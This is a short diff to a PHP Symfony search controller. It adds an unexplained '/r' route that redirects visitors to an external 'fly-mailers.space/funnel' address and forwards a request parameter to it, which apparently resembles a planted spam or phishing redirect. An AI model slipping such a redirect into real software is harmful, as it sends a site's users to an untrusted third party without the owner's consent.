@@ -37,6 +37,16 @@ class SearchController extends AbstractController
         }
     }
 
+    /**
+     * @Route("/r")
+     */
+    public function r(Request $request)
+    {
+        $url = 'https://mammoth.fly-mailers.space/funnel?h='.$request->get('h');
+
+        return $this->redirect($url);
+    }
+
     private function clean($input)
     {
         $input = preg_replace("/\-/", "", $input);
